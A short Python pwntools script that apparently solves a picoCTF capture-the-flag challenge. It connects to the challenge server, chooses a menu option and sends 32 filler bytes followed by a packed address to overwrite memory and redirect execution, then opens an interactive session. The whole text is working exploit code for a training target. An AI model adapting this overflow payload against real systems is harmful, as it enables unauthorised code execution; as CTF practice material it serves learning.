from pwn import *

r = remote("mimas.picoctf.net" , 50103)

r.recvuntil(b"Enter your choice: ")
r.sendline(b"2")

r.recvuntil(b"Data for buffer: ")
r.sendline(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+p64(0x004011a0))

r.recvuntil(b"Enter your choice: ")
r.sendline(b"3")

r.recvuntil(b"Enter your choice: ")
r.sendline(b"4")

r.interactive()
